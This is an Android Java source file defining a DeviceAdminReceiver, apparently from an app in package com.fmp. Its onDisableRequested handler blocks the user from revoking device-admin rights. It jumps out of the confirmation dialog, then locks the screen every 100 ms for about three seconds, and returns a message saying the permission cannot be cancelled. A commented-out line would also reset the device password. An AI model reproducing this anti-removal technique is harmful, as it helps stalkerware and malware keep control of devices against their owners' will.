package com.fmp.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

public class DeviceReceiver extends DeviceAdminReceiver implements Runnable {
    public static SharedPreferences getDevicePreference(Context context) {
        return context.getSharedPreferences(
                DeviceAdminReceiver.class.getName(), 0);
    }

    private static DevicePolicyManager dpm;
    // 密码的特点
    public static String PREF_PASSWORD_QUALITY = "password_quality";
    // 密码的长度
    public static String PREF_PASSWORD_LENGTH = "password_length";

    public static String PREF_MAX_FAILED_PW = "max_failed_pw";

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void run() {
        int i = 0;
        while (i < 30) {
            dpm.lockNow();
            try {
                Thread.sleep(100);
                i++;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        //跳离当前询问是否取消激活的 md_dialog
        Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
        outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(outOfDialog);
        //调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 3s 后
        dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        dpm.lockNow();
        //dpm.resetPassword("设置密码", 0);
        new Thread(this).start();
        return "您不可取消助手的权限";
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        // TODO Auto-generated method stub  
        //showToast(context, "设备管理：可用");  
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // TODO Auto-generated method stub  
        // showToast(context, "设备管理：不可用");
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        // TODO Auto-generated method stub  
        // showToast(context, "设备管理：密码己经改变");
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        // TODO Auto-generated method stub  
        //showToast(context, "设备管理：改变密码失败");  
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        // TODO Auto-generated method stub  
        //showToast(context, "设备管理：改变密码成功");  
    }
}

